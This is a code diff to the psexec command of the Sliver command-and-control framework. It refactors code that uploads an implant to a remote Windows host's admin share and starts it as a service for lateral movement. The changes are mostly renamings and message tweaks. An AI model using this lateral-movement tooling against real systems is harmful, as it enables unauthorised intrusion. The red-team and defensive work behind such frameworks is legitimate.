@@ -21,11 +21,12 @@ package exec
 import (
 	"context"
 	"fmt"
-	"math/rand"
+	insecureRand "math/rand"
 	"strings"
 	"time"
 
 	"github.com/bishopfox/sliver/client/command/generate"
+	"github.com/bishopfox/sliver/client/command/settings"
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/commonpb"
@@ -36,14 +37,14 @@ import (
 
 // PsExecCmd - psexec command implementation.
 func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
-	session := con.ActiveSession.GetInteractive()
+	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
 
 	hostname := ctx.Args.String("hostname")
 	if hostname == "" {
-		con.PrintWarnf("you need to provide a target host, see `help psexec` for examples")
+		con.PrintErrorf("You need to provide a target host, see `help psexec` for examples")
 		return
 	}
 	profile := ctx.Flags.String("profile")
@@ -53,9 +54,9 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	uploadPath := fmt.Sprintf(`\\%s\%s`, hostname, strings.ReplaceAll(strings.ToLower(ctx.Flags.String("binpath")), "c:", "C$"))
 
 	if serviceName == "Sliver" || serviceDesc == "Sliver implant" {
-		con.PrintWarnf("Warning: You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
+		con.PrintWarnf("You're going to deploy the following service:\n- Name: %s\n- Description: %s\n", serviceName, serviceDesc)
 		con.PrintWarnf("You might want to change that before going further...\n")
-		if !con.IsUserAnAdult() {
+		if !settings.IsUserAnAdult(con) {
 			return
 		}
 	}
@@ -96,7 +97,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 		Encoder: "gzip",
 		Data:    uploadGzip,
 		Path:    filePath,
-		Request: con.ActiveSession.Request(ctx),
+		Request: con.ActiveTarget.Request(ctx),
 	})
 	uploadCtrl <- true
 	<-uploadCtrl
@@ -119,7 +120,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 	start, err := con.Rpc.StartService(context.Background(), &sliverpb.StartServiceReq{
 		BinPath:            binaryPath,
 		Hostname:           hostname,
-		Request:            con.ActiveSession.Request(ctx),
+		Request:            con.ActiveTarget.Request(ctx),
 		ServiceDescription: serviceDesc,
 		ServiceName:        serviceName,
 		Arguments:          "",
@@ -142,7 +143,7 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 			Hostname:    hostname,
 			ServiceName: serviceName,
 		},
-		Request: con.ActiveSession.Request(ctx),
+		Request: con.ActiveTarget.Request(ctx),
 	})
 	removeChan <- true
 	<-removeChan
@@ -159,10 +160,9 @@ func PsExecCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
 
 func randomString(length int) string {
 	var charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
-	var seededRand *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano()))
 	b := make([]byte, length)
 	for i := range b {
-		b[i] = charset[seededRand.Intn(len(charset))]
+		b[i] = charset[insecureRand.Intn(len(charset))]
 	}
 	return string(b)
 }
